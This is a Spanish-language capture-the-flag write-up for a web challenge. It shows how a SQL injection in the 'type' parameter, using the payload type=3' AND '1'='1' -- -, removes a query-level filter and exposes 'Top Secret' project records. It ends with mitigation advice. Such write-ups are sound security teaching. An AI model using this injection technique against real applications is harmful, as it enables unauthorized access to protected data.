# NSA - SoftwareSeguro

**Dificultad:** CTF  
**Fecha:** 09/2026  
**Sistema:** Web  
**Objetivo:** Acceder a los proyectos de tipo **APT** con nivel **Top Secret**  
**Acceso inicial:** SQL Injection mediante manipulación del parámetro `type`  

## Herramientas

`Chrome DevTools` `Burp Suite`

## Técnicas

`Web Enumeration` `HTTP Request Analysis` `SQL Injection` `Parameter Manipulation` `Access Control Bypass`

## Introducción

El desafío consiste en ayudar a un agente secreto a acceder a proyectos de tipo **APT (Advanced Persistent Threat)**. La aplicación permite consultar proyectos según su tipo mediante un parámetro `type`. Los proyectos APT tienen nivel de acceso **Top Secret**, pero la aplicación los excluye por restricciones de acceso. El objetivo es modificar la consulta para acceder a los proyectos que normalmente no se muestran.

## Reconocimiento

La aplicación realiza peticiones al endpoint:

```text
/backend/index.php
```

La consulta de proyectos se realiza mediante el parámetro `type`, con valores `type=1`, `type=2`, `type=3`. El valor `3` corresponde a proyectos de tipo **APT**. Al realizar:

```http
GET /backend/index.php?type=3
```

el servidor responde con una lista vacía:

```json
{"status": "ok", "data": {"projects": []}}
```

A diferencia de los otros tipos, `type=3` no devuelve proyectos, pese a que el desafío indica explícitamente que existen.

## Análisis de la petición

Se prueba agregar una comilla simple al valor del parámetro (`type=3'`). El servidor devuelve un error de sintaxis SQL que expone parte de la consulta ejecutada:

```text
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
```

```sql
AND p.id_nivel != (
    SELECT id FROM niveles
    WHERE nombre='Top Secret'
)
```

Esto confirma dos cosas: que el parámetro `type` se incorpora a una consulta SQL sin parametrización, y que existe un filtro explícito que excluye los proyectos con nivel `Top Secret`.

## Vulnerabilidad identificada

**SQL Injection con bypass de control de acceso (CWE-89 / CWE-863: Incorrect Authorization)**

El parámetro `type` se concatena directamente en la consulta SQL del backend sin sanitización ni uso de consultas parametrizadas. Esto no solo permite inyectar SQL arbitrario, sino que además el filtro de autorización que restringe el acceso a proyectos `Top Secret` está implementado como una condición dentro de la misma consulta (en vez de como un control de autorización independiente), por lo que la inyección SQL permite eliminar dicho filtro directamente.

Conceptualmente, la consulta vulnerable tiene una estructura similar a:

```sql
WHERE p.tipo = '3'
AND p.id_nivel != (
    SELECT id FROM niveles
    WHERE nombre='Top Secret'
)
```

## Explotación

Se construye el payload:

```text
type=3' AND '1'='1' -- -
```

La condición `'1'='1'` es siempre verdadera, y `-- -` comenta el resto de la consulta SQL en MySQL. De forma conceptual, la consulta pasa a comportarse como:

```sql
WHERE p.tipo = '3'
AND '1'='1'
-- resto de la consulta comentado
```

El filtro que excluía los proyectos `Top Secret` deja de aplicarse. La petición final es:

```http
GET /backend/index.php?type=3' AND '1'='1' -- -
```

## Resultado

La respuesta obtenida contiene los proyectos que antes no se mostraban:

| Código    | Proyecto                                        | Tipo            | Nivel      | Owner |
| --------- | ------------------------------------------------ | ---------------- | ---------- | ----- |
| `NS4_AS2` | Colombia warfare                                 | Spying           | Secret     | Frank |
| `NS4_AN1` | Chinese Firewall                                 | Targeted attack  | Restricted | Eric  |
| `NS4_A1L` | Nisman case                                      | Spying           | Restricted | Brian |
| `NS4_B2W` | Terrorists - `141e9ea9d1c4ade203ffe3ee03ebff1c`  | APT              | Top Secret | Brian |
| `NS4_OIL` | EkoParty destruction                             | APT              | Top Secret | Eric  |

Los dos proyectos objetivo (tipo APT, nivel Top Secret) son `NS4_B2W` (Terrorists) y `NS4_OIL` (EkoParty destruction).

## Impacto

La vulnerabilidad permite a cualquier usuario no autorizado leer información clasificada como `Top Secret` simplemente manipulando un parámetro GET, sin necesidad de credenciales adicionales ni de conocer estructura interna de la base de datos más allá de lo que el propio mensaje de error SQL reveló. Dado que el control de acceso está implementado únicamente a nivel de consulta SQL y no como una capa de autorización independiente, cualquier inyección SQL sobre ese endpoint compromete directamente la confidencialidad de todos los niveles de clasificación del sistema, no solo `Top Secret`.

## Evidencia

### Respuesta vacía para type=3

```json
{"status": "ok", "data": {"projects": []}}
```

### Error SQL con comilla simple

```text
You have an error in your SQL syntax...
AND p.id_nivel != (SELECT id FROM niveles WHERE nombre='Top Secret')
```

### Payload de bypass

```text
type=3' AND '1'='1' -- -
```

### Proyectos APT obtenidos

```text
NS4_B2W - Terrorists - 141e9ea9d1c4ade203ffe3ee03ebff1c
NS4_OIL - EkoParty destruction
```

## Conclusión

El desafío demuestra cómo una vulnerabilidad de SQL Injection puede usarse no solo para extraer datos, sino para evadir directamente un mecanismo de control de acceso cuando dicho control está implementado como parte de la lógica de la consulta SQL en lugar de como una capa de autorización independiente y verificada en el backend.

## Mitigación

1. Utilizar siempre consultas parametrizadas (prepared statements) en lugar de concatenar datos de entrada directamente en sentencias SQL.
2. Implementar el control de autorización (qué nivel de clasificación puede ver cada usuario) como una capa independiente de la consulta de datos, verificada en el backend antes o después de la consulta, no como una condición `WHERE` manipulable.
3. No exponer mensajes de error de base de datos con detalle de la consulta SQL en producción — el error revelado fue clave para identificar tanto la inyección como el filtro a evadir.
